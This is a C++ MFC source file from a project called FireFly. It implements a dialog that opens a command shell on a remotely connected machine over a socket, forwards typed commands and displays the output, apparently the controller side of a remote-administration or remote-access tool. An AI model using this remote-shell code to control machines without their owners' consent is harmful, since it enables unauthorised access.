// CmdShell.cpp : 实现文件
//

#include "stdafx.h"
#include "FireFly.h"
#include "Cmd.h"
#include "afxdialogex.h"
#include "FireFlyDlg.h"

// CCmd 对话框

IMPLEMENT_DYNAMIC(CCmd, CDialogEx)

CCmd::CCmd(CWnd* pParent,SOCKET sk)
	: CDialogEx(CCmd::IDD, pParent)
{
	CurrentSock=sk;
	pDlg = (CFireFlyDlg*)AfxGetApp()->m_pMainWnd;
}

CCmd::~CCmd()
{
}

void CCmd::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CMDSHELL, m_CmdShow);
}


BEGIN_MESSAGE_MAP(CCmd, CDialogEx)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()




void CCmd::OnCancel()
{
	pDlg->m_ClientSock.MySendCommand(CurrentSock,MYCMDSHELL,"exit",1024,WRITECMD);
	CDialogEx::OnCancel();
	pDlg->MyDeleteCMDShell();
}


BOOL CCmd::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	pDlg->m_ClientSock.MySendCommand(CurrentSock,MYCMDSHELL,NULL,0,STARTCMD);

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void CCmd::CmdCommand(COMMAND cmd)
{
	switch(cmd.fID)
	{
	case STARTCMD:
		MyShowText(cmd);
		break;
	case STARTCMDERROR:
		break;
	default:
		break;
	}
}

void CCmd::MyShowText(COMMAND cmd)
{
	m_CmdShow.SetSel(-1,-1);
	CString temp = pDlg->m_custom.MyCharToWide(cmd.buffer);
	m_CmdShow.ReplaceSel(temp);
}

BOOL CCmd::PreTranslateMessage(MSG* pMsg)
{
	if(pMsg->message==WM_KEYDOWN)
	{
		if(pMsg->wParam==VK_RETURN)
		{
			WCHAR buffer[1024]={0};
			int idx=m_CmdShow.GetLineCount()-1;
			m_CmdShow.GetLine(idx,buffer,1024);
			WCHAR* pPos=wcsrchr(buffer,'>');
			pPos++;
			char Temp[1024]={0};
			wsprintfA(Temp,"%s",pDlg->m_custom.MyWideToChar(pPos));
			pDlg->m_ClientSock.MySendCommand(CurrentSock,MYCMDSHELL,Temp,1024,WRITECMD);
		}
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}


HBRUSH CCmd::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);

	if (pWnd->GetDlgCtrlID() == IDC_CMDSHELL)   //控件
	{
		pDC->SetBkMode(TRANSPARENT);   
		pDC->SetTextColor(RGB(255,   255,  255)); //   字的颜色   
		HBRUSH   hBr   =   CreateSolidBrush(RGB(0,0,0));   //   背景色   
		return   (HBRUSH)   hBr;  
	}
	return hbr;
}
